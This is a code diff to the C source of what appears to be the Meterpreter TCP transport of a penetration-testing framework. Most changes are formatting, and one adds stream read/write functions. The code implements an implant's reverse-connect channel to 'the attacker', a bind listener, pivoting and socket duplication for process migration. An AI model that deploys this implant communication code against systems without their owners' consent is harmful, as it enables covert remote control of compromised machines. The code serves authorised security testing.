@@ -12,7 +12,7 @@ typedef struct _TCPMIGRATECONTEXT
 {
 	COMMONMIGRATECONTEXT common;
 	WSAPROTOCOL_INFOA info;
-} TCPMIGRATECONTEXT, * LPTCPMIGRATECONTEXT;
+} TCPMIGRATECONTEXT, *LPTCPMIGRATECONTEXT;
 
 // These fields aren't defined unless the SDK version is set to something old enough.
 // So we define them here instead of dancing with SDK versions, allowing us to move on
@@ -30,7 +30,7 @@ typedef struct _TCPMIGRATECONTEXT
  * @param retryWait The number of seconds between each connect attempt.
  * @return Indication of success or failure.
  */
-static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockAddrSize, DWORD retryTotal, DWORD retryWait)
+static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR *sockAddr, int sockAddrSize, DWORD retryTotal, DWORD retryWait)
 {
 	DWORD result = ERROR_SUCCESS;
 	int start = current_unix_timestamp();
@@ -62,12 +62,12 @@ static DWORD reverse_tcp_run(SOCKET reverseSocket, SOCKADDR* sockAddr, int sockA
  * @param retryWait The number of seconds between each connect attempt.
  * @return Indication of success or failure.
  */
-static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWORD retryWait, SOCKET* socketBuffer)
+static DWORD reverse_tcp4(const char *host, u_short port, DWORD retryTotal, DWORD retryWait, SOCKET *socketBuffer)
 {
 	*socketBuffer = 0;
 
 	// start by attempting to fire up Winsock.
-	WSADATA wsaData = { 0 };
+	WSADATA wsaData = {0};
 	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
 	{
 		return WSAGetLastError();
@@ -75,15 +75,15 @@ static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWOR
 
 	// prepare to connect to the attacker
 	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-	struct hostent* target = gethostbyname(host);
-	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);
+	struct hostent *target = gethostbyname(host);
+	char *targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);
 
-	SOCKADDR_IN sock = { 0 };
+	SOCKADDR_IN sock = {0};
 	sock.sin_addr.s_addr = inet_addr(targetIp);
 	sock.sin_family = AF_INET;
 	sock.sin_port = htons(port);
 
-	DWORD result = reverse_tcp_run(socketHandle, (SOCKADDR*)&sock, sizeof(sock), retryTotal, retryWait);
+	DWORD result = reverse_tcp_run(socketHandle, (SOCKADDR *)&sock, sizeof(sock), retryTotal, retryWait);
 
 	if (result == ERROR_SUCCESS)
 	{
@@ -102,18 +102,18 @@ static DWORD reverse_tcp4(const char* host, u_short port, DWORD retryTotal, DWOR
  * @param retryWait The number of seconds between each connect attempt.
  * @return Indication of success or failure.
  */
-static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, DWORD retryTotal, DWORD retryWait, SOCKET* socketBuffer)
+static DWORD reverse_tcp6(const char *host, const char *service, ULONG scopeId, DWORD retryTotal, DWORD retryWait, SOCKET *socketBuffer)
 {
 	*socketBuffer = 0;
 
 	// start by attempting to fire up Winsock.
-	WSADATA wsaData = { 0 };
+	WSADATA wsaData = {0};
 	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
 	{
 		return WSAGetLastError();
 	}
 
-	ADDRINFO hints = { 0 };
+	ADDRINFO hints = {0};
 	hints.ai_family = AF_INET6;
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_protocol = IPPROTO_TCP;
@@ -169,7 +169,7 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
  * @param acceptSocketBuffer Buffer that will receive the accepted socket handle on success.
  * @return Indication of success or failure.
  */
-static DWORD bind_tcp_run(SOCKET listenSocket, SOCKADDR* sockAddr, int sockAddrSize, SOCKET* acceptSocketBuffer)
+static DWORD bind_tcp_run(SOCKET listenSocket, SOCKADDR *sockAddr, int sockAddrSize, SOCKET *acceptSocketBuffer)
 {
 	DWORD result = ERROR_SUCCESS;
 	do
@@ -209,12 +209,12 @@ static DWORD bind_tcp_run(SOCKET listenSocket, SOCKADDR* sockAddr, int sockAddrS
  * @param socketBuffer Pointer to the variable that will recieve the socket file descriptor.
  * @return Indication of success or failure.
  */
-static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
+static DWORD bind_tcp(u_short port, SOCKET *socketBuffer)
 {
 	*socketBuffer = 0;
 
 	// start by attempting to fire up Winsock.
-	WSADATA wsaData = { 0 };
+	WSADATA wsaData = {0};
 	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
 	{
 		return WSAGetLastError();
@@ -234,7 +234,7 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 	else
 	{
 		int no = 0;
-		if (setsockopt(listenSocket, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&no, sizeof(no)) == SOCKET_ERROR)
+		if (setsockopt(listenSocket, IPPROTO_IPV6, IPV6_V6ONLY, (char *)&no, sizeof(no)) == SOCKET_ERROR)
 		{
 			// fallback to ipv4 - we're probably running on Windows XP or earlier here, which means that to
 			// support IPv4 and IPv6 we'd need to create two separate sockets. IPv6 on XP isn't that common
@@ -251,11 +251,11 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 		listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	}
 
-	struct sockaddr_in6 sockAddr = { 0 };
+	struct sockaddr_in6 sockAddr = {0};
 
 	if (v4Fallback)
 	{
-		struct sockaddr_in* v4Addr = (struct sockaddr_in*)&sockAddr;
+		struct sockaddr_in *v4Addr = (struct sockaddr_in *)&sockAddr;
 		v4Addr->sin_addr.s_addr = htons(INADDR_ANY);
 		v4Addr->sin_family = AF_INET;
 		v4Addr->sin_port = htons(port);
@@ -267,7 +267,7 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 		sockAddr.sin6_port = htons(port);
 	}
 
-	return bind_tcp_run(listenSocket, (SOCKADDR*)&sockAddr, v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), socketBuffer);
+	return bind_tcp_run(listenSocket, (SOCKADDR *)&sockAddr, v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6), socketBuffer);
 }
 
 /*!
@@ -276,9 +276,9 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
  * @param timeout Amount of time to wait before the poll times out (in milliseconds).
  * @return Indication of success or failure.
  */
-static LONG server_socket_poll(Remote* remote, long timeout)
+static LONG server_socket_poll(Remote *remote, long timeout)
 {
-	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+	TcpTransportContext *ctx = (TcpTransportContext *)remote->transport->ctx;
 	struct timeval tv;
 	LONG result;
 	fd_set fdread;
@@ -308,12 +308,12 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 {
 	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
 	Packet *localPacket = NULL;
-	PacketHeader header = { 0 };
+	PacketHeader header = {0};
 	int bytesRead;
 	BOOL inHeader = TRUE;
 	PUCHAR packetBuffer = NULL;
 	ULONG payloadLength;
-	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+	TcpTransportContext *ctx = (TcpTransportContext *)remote->transport->ctx;
 
 	lock_acquire(remote->lock);
 
@@ -321,7 +321,7 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 	// Read the packet length
 	while (inHeader)
 	{
-		if ((bytesRead = recv(ctx->fd, ((PCHAR)&header + headerBytes), sizeof(PacketHeader)-headerBytes, 0)) <= 0)
+		if ((bytesRead = recv(ctx->fd, ((PCHAR)&header + headerBytes), sizeof(PacketHeader) - headerBytes, 0)) <= 0)
 		{
 			SetLastError(ERROR_NOT_FOUND);
 			goto out;
@@ -348,7 +348,7 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 #ifdef DEBUGTRACE
 	PUCHAR h = (PUCHAR)&header;
 	vdprintf("[TCP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
-		h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
+			 h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
 #endif
 
 	// At this point, we might have read in a valid TLV packet, or we might have read in the first chunk of data
@@ -358,7 +358,7 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 	if (header.xor_key[3] == 0)
 	{
 		// looks like we have a metsrv instance, time to ignore it.
-		int length = *(int*)&header.xor_key[0];
+		int length = *(int *)&header.xor_key[0];
 		dprintf("[TCP] discovered a length header, assuming it's metsrv of length %d", length);
 
 		int bytesToRead = length - sizeof(PacketHeader) + sizeof(DWORD);
@@ -401,7 +401,7 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 #ifdef DEBUGTRACE
 		PUCHAR h = (PUCHAR)&header;
 		vdprintf("[TCP] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
-			h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
+				 h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
 #endif
 		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
 		vdprintf("[TCP] Payload length is %d", payloadLength);
@@ -454,7 +454,7 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 #ifdef DEBUGTRACE
 		h = (PUCHAR)&header.session_guid[0];
 		dprintf("[TCP] Packet Session GUID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
-			h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
+				h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
 #endif
 		if (is_null_guid(header.session_guid) || memcmp(remote->orig_config->session.session_guid, header.session_guid, sizeof(header.session_guid)) == 0)
 		{
@@ -464,7 +464,7 @@ static DWORD packet_receive(Remote *remote, Packet **packet)
 		else
 		{
 			dprintf("[TCP] Session GUIDs don't match, looking for a pivot");
-			PivotContext* pivotCtx = pivot_tree_find(remote->pivot_sessions, header.session_guid);
+			PivotContext *pivotCtx = pivot_tree_find(remote->pivot_sessions, header.session_guid);
 			if (pivotCtx != NULL)
 			{
 				dprintf("[TCP] Pivot found, dispatching packet on a thread (to avoid main thread blocking)");
@@ -505,13 +505,13 @@ out:
  * @param dispatchThread Pointer to the main dispatch thread.
  * @returns Indication of success or failure.
  */
-static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
+static DWORD server_dispatch_tcp(Remote *remote, THREAD *dispatchThread)
 {
-	Transport* transport = remote->transport;
+	Transport *transport = remote->transport;
 	BOOL running = TRUE;
 	LONG result = ERROR_SUCCESS;
-	Packet * packet = NULL;
-	THREAD * cpt = NULL;
+	Packet *packet = NULL;
+	THREAD *cpt = NULL;
 
 	dprintf("[DISPATCH] entering server_dispatch( 0x%08X )", remote);
 
@@ -581,11 +581,11 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
  * @param transport Pointer to the TCP transport containing the socket.
  * @return The current transport socket FD, if any, or zero.
  */
-static UINT_PTR transport_get_handle_tcp(Transport* transport)
+static UINT_PTR transport_get_handle_tcp(Transport *transport)
 {
 	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
 	{
-		return (UINT_PTR)((TcpTransportContext*)transport->ctx)->fd;
+		return (UINT_PTR)((TcpTransportContext *)transport->ctx)->fd;
 	}
 
 	return 0;
@@ -596,11 +596,11 @@ static UINT_PTR transport_get_handle_tcp(Transport* transport)
  * @param transport Pointer to the TCP transport containing the socket.
  * @param handle The current transport socket FD, if any.
  */
-static void transport_set_handle_tcp(Transport* transport, UINT_PTR handle)
+static void transport_set_handle_tcp(Transport *transport, UINT_PTR handle)
 {
 	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
 	{
-		((TcpTransportContext*)transport->ctx)->fd = (SOCKET)handle;
+		((TcpTransportContext *)transport->ctx)->fd = (SOCKET)handle;
 	}
 }
 
@@ -608,7 +608,7 @@ static void transport_set_handle_tcp(Transport* transport, UINT_PTR handle)
  * @brief Destroy the TCP transport.
  * @param transport Pointer to the TCP transport to destroy.
  */
-static void transport_destroy_tcp(Transport* transport)
+static void transport_destroy_tcp(Transport *transport)
 {
 	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
 	{
@@ -624,7 +624,7 @@ static void transport_destroy_tcp(Transport* transport)
  * @param thread Pointer to the thread instance.
  * @return EXIT_SUCCESS
  */
-DWORD THREADCALL cleanup_socket(THREAD* thread)
+DWORD THREADCALL cleanup_socket(THREAD *thread)
 {
 	char buf[4];
 	int result;
@@ -652,11 +652,11 @@ DWORD THREADCALL cleanup_socket(THREAD* thread)
  * @param transport Pointer to the TCP transport to reset.
  * @param shuttingDown Indication that the Metsrv instance is terminating completely.
  */
-static void transport_reset_tcp(Transport* transport, BOOL shuttingDown)
+static void transport_reset_tcp(Transport *transport, BOOL shuttingDown)
 {
 	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
 	{
-		TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
+		TcpTransportContext *ctx = (TcpTransportContext *)transport->ctx;
 		dprintf("[TCP] Resetting transport from %u", ctx->fd);
 		if (ctx->fd)
 		{
@@ -676,7 +676,7 @@ static void transport_reset_tcp(Transport* transport, BOOL shuttingDown)
 				// before cleaning up the socket. This is done in another thread so that functionality
 				// can continue.
 				dprintf("[TCP] It should now be safe to close the socket.");
-				THREAD* t = thread_create(cleanup_socket, (LPVOID)ctx->fd, NULL, NULL);
+				THREAD *t = thread_create(cleanup_socket, (LPVOID)ctx->fd, NULL, NULL);
 				thread_run(t);
 			}
 		}
@@ -690,12 +690,12 @@ static void transport_reset_tcp(Transport* transport, BOOL shuttingDown)
  * @param transport Pointer to the transport instance.
  * @return Indication of success or failure.
  */
-static DWORD configure_tcp_connection(Transport* transport)
+static DWORD configure_tcp_connection(Transport *transport)
 {
 	DWORD result = ERROR_SUCCESS;
 	size_t charsConverted;
 	char asciiUrl[512];
-	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
+	TcpTransportContext *ctx = (TcpTransportContext *)transport->ctx;
 
 	// check if comms is already open via a staged payload
 	if (ctx->fd)
@@ -705,27 +705,27 @@ static DWORD configure_tcp_connection(Transport* transport)
 	else
 	{
 		// From here, we need to establish comms a-la stageless.
-		wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), transport->url, sizeof(asciiUrl)-1);
+		wcstombs_s(&charsConverted, asciiUrl, sizeof(asciiUrl), transport->url, sizeof(asciiUrl) - 1);
 
 		dprintf("[TCP CONFIGURE] Url: %S", transport->url);
 
-		//transport->start_time = current_unix_timestamp();
+		// transport->start_time = current_unix_timestamp();
 		transport->comms_last_packet = current_unix_timestamp();
 
 		if (strncmp(asciiUrl, "tcp", 3) == 0)
 		{
-			char* pHost = strstr(asciiUrl, "//") + 2;
-			char* pPort = strrchr(pHost, ':') + 1;
+			char *pHost = strstr(asciiUrl, "//") + 2;
+			char *pPort = strrchr(pHost, ':') + 1;
 
 			// check if we're using IPv6
 			if (asciiUrl[3] == '6')
 			{
-				char* pScopeId = strrchr(pHost, '?') + 1;
+				char *pScopeId = strrchr(pHost, '?') + 1;
 				*(pScopeId - 1) = '\0';
 				*(pPort - 1) = '\0';
 				dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
 				result = reverse_tcp6(pHost, pPort, atol(pScopeId), transport->timeouts.retry_total,
-					transport->timeouts.retry_wait, &ctx->fd);
+									  transport->timeouts.retry_wait, &ctx->fd);
 			}
 			else
 			{
@@ -743,7 +743,7 @@ static DWORD configure_tcp_connection(Transport* transport)
 					*(pPort - 1) = '\0';
 					dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
 					result = reverse_tcp4(pHost, usPort, transport->timeouts.retry_total,
-						transport->timeouts.retry_wait, &ctx->fd);
+										  transport->timeouts.retry_wait, &ctx->fd);
 				}
 			}
 		}
@@ -753,8 +753,8 @@ static DWORD configure_tcp_connection(Transport* transport)
 	{
 		dprintf("[SERVER] Something went wrong %u", result);
 	}
-  else
-  {
+	else
+	{
 		dprintf("[SERVER] Looking good, FORWARD!");
 
 		// Do not allow the file descriptor to be inherited by child processes
@@ -773,9 +773,9 @@ static DWORD configure_tcp_connection(Transport* transport)
  * @param rawPacketLength Length of the raw packet data.
  * @return An indication of the result of processing the transmission request.
  */
-DWORD packet_transmit_tcp(Remote* remote, LPBYTE rawPacket, DWORD rawPacketLength)
+DWORD packet_transmit_tcp(Remote *remote, LPBYTE rawPacket, DWORD rawPacketLength)
 {
-	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
+	TcpTransportContext *ctx = (TcpTransportContext *)remote->transport->ctx;
 	DWORD result = ERROR_SUCCESS;
 	DWORD idx = 0;
 
@@ -815,7 +815,7 @@ DWORD packet_transmit_tcp(Remote* remote, LPBYTE rawPacket, DWORD rawPacketLengt
  * @param transport Transport data to create the configuration from.
  * @return config Pointer to the config block to write to.
  */
-void transport_write_tcp_config(Transport* transport, MetsrvTransportTcp* config)
+void transport_write_tcp_config(Transport *transport, MetsrvTransportTcp *config)
 {
 	if (transport && config)
 	{
@@ -835,7 +835,7 @@ void transport_write_tcp_config(Transport* transport, MetsrvTransportTcp* config
  * @param contextBufer Buffer that will receive the generated context.
  * @return Indication of success or failure.
  */
-static DWORD get_migrate_context_tcp(Transport* transport, DWORD targetProcessId, HANDLE targetProcessHandle, LPDWORD contextSize, LPBYTE* contextBuffer)
+static DWORD get_migrate_context_tcp(Transport *transport, DWORD targetProcessId, HANDLE targetProcessHandle, LPDWORD contextSize, LPBYTE *contextBuffer)
 {
 	LPTCPMIGRATECONTEXT ctx = (LPTCPMIGRATECONTEXT)calloc(1, sizeof(TCPMIGRATECONTEXT));
 
@@ -845,7 +845,7 @@ static DWORD get_migrate_context_tcp(Transport* transport, DWORD targetProcessId
 	}
 
 	// Duplicate the socket for the target process
-	if (WSADuplicateSocketA(((TcpTransportContext*)transport->ctx)->fd, targetProcessId, &ctx->info) != NO_ERROR)
+	if (WSADuplicateSocketA(((TcpTransportContext *)transport->ctx)->fd, targetProcessId, &ctx->info) != NO_ERROR)
 	{
 		free(ctx);
 		return WSAGetLastError();
@@ -862,9 +862,21 @@ static DWORD get_migrate_context_tcp(Transport* transport, DWORD targetProcessId
  * @param t Pointer to the transport.
  * @return Size, in bytes of the required memory block.
  */
-static DWORD transport_get_config_size_tcp(Transport* t)
+static DWORD transport_get_config_size_tcp(Transport *t)
 {
 	return sizeof(MetsrvTransportTcp);
+}
+
+static int transport_stream_read(Transport *transport, PCHAR buffer, int length)
+{
+	TcpTransportContext *ctx = (TcpTransportContext *)transport->ctx;
+	return recv(ctx->fd, (PCHAR)(buffer), length, 0);
+}
+
+static int transport_stream_write(Transport *transport, PCHAR buffer, int length)
+{
+	TcpTransportContext *ctx = (TcpTransportContext *)transport->ctx;
+	return send(ctx->fd, (PCHAR)(buffer), length, 0);
 }
 
 /*!
@@ -873,10 +885,10 @@ static DWORD transport_get_config_size_tcp(Transport* t)
  * @param size Pointer to the size of the parsed config block.
  * @return Pointer to the newly configured/created TCP transport instance.
  */
-Transport* transport_create_tcp(MetsrvTransportTcp* config, LPDWORD size)
+Transport *transport_create_tcp(MetsrvTransportTcp *config, LPDWORD size)
 {
-	Transport* transport = (Transport*)malloc(sizeof(Transport));
-	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
+	Transport *transport = (Transport *)malloc(sizeof(Transport));
+	TcpTransportContext *ctx = (TcpTransportContext *)malloc(sizeof(TcpTransportContext));
 
 	if (size)
 	{
@@ -897,6 +909,8 @@ Transport* transport_create_tcp(MetsrvTransportTcp* config, LPDWORD size)
 	transport->transport_init = configure_tcp_connection;
 	transport->transport_destroy = transport_destroy_tcp;
 	transport->transport_reset = transport_reset_tcp;
+	transport->transport_stream_read = transport_stream_read;
+	transport->transport_stream_write = transport_stream_write;
 	transport->server_dispatch = server_dispatch_tcp;
 	transport->get_handle = transport_get_handle_tcp;
 	transport->set_handle = transport_set_handle_tcp;
@@ -907,4 +921,3 @@ Transport* transport_create_tcp(MetsrvTransportTcp* config, LPDWORD size)
 
 	return transport;
 }
-
